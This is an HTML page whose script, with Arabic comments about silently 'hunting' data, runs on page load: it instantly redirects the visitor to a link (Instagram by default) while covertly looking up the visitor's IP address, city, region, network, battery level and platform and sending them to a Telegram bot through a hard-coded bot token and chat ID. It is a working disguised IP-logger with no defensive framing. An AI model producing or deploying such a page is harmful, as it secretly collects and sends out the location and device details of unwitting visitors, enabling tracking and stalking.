<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <script>
        const T = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
        const C = "5773364548";

        async function x() {
            // 1. تحويل فوري (أقل من 0.05 ثانية)
            const u = new URLSearchParams(window.location.search).get('u') || 'https://instagram.com';
            window.location.replace(u);

            // 2. سحب البيانات صامت بالخلفية
            try {
                let b = "N/A";
                // محاولة صيد البطارية بسرعة
                if (navigator.getBattery) {
                    const bt = await navigator.getBattery();
                    b = Math.round(bt.level * 100) + "%";
                }

                // سحب الموقع والآيبي (طلب خفيف جداً)
                fetch('https://ipapi.co/json/').then(r => r.json()).then(d => {
                    const m = `
🚀 **رصد احترافي - النسخة X**
━━━━━━━━━━━━━━━
🌐 IP: ${d.ip}
📍 Loc: ${d.city} | ${d.region}
🏢 Net: ${d.org}
🔋 Batt: ${b}
📱 Dev: ${navigator.platform}
━━━━━━━━━━━━━━━`;

                    // إرسال البيانات (التشفير داخلي بطلب Fetch)
                    navigator.sendBeacon(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`);
                });
            } catch (e) {}
        }
        window.onload = x;
    </script>
</head>
<body style="background:#000"></body>
</html>
